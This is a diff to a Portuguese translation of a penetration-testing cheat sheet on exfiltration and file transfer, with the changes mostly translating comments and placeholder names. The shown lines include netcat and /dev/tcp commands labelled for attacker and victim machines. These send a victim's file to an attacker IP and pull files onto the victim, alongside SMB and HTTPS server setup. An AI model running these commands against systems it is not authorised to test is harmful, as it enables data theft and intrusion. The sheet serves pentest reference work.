@@ -57,7 +57,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 #    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
 # execute do seguinte modo:
 #    python simple-https-server.py
-# e então no seu navegador, visite:
+# e então no seu navegador, acesse:
 #    https://localhost:443
 
 import BaseHTTPServer, SimpleHTTPServer
@@ -123,7 +123,7 @@ Kali como servidor
 
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Compartilha o diretório atual
-kali_op2> smbserver.py -smb2support name /path/folder # Compartilha um diretório
+kali_op2> smbserver.py -smb2support nomeDoCompartilhamento /caminho/para/o/diretório # Compartilha um diretório
 # Para novas versões do Windows 10
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
@@ -175,17 +175,17 @@ nc -vn <IP> 4444 < arquivo_de_exfiltração
 ### Download de arquivo da vítima
 
 ```bash
-nc -lvnp 80 > file # máquina atacante
-cat /path/file > /dev/tcp/10.10.10.10/80 # máquina vítima
+nc -lvnp 80 > arquivo # máquina atacante
+cat /caminho/para/o/arquivo > /dev/tcp/10.10.10.10/80 # máquina vítima
 ```
 
 ### Upload de arquivo para a vítima
 
 ```bash
-nc -w5 -lvnp 80 < file_to_send.txt # máquina atacante
+nc -w5 -lvnp 80 < arquivo_para_enviar.txt # máquina atacante
 # máquina vítima
 exec 6< /dev/tcp/10.10.10.10/4444
-cat <&6 > file.txt
+cat <&6 > arquivo.txt
 ```
 
 obrigado ao **@BinaryShadow\_**
